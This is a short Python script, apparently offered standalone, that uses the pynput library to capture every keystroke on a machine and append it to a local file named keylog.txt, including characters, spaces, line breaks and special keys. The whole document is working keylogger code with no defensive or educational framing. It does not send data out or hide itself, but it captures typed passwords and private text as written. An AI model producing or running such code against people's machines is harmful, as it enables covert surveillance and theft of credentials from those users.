from pynput import keyboard

# Define the file to store keystrokes
log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            elif key == keyboard.Key.space:
                f.write(" ")  # Log spaces
            elif key == keyboard.Key.enter:
                f.write("\n")  # Log new lines
            else:
                f.write(f' [{key}] ')
    except Exception as e:
        print(f"Error logging key: {e}")

def main():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
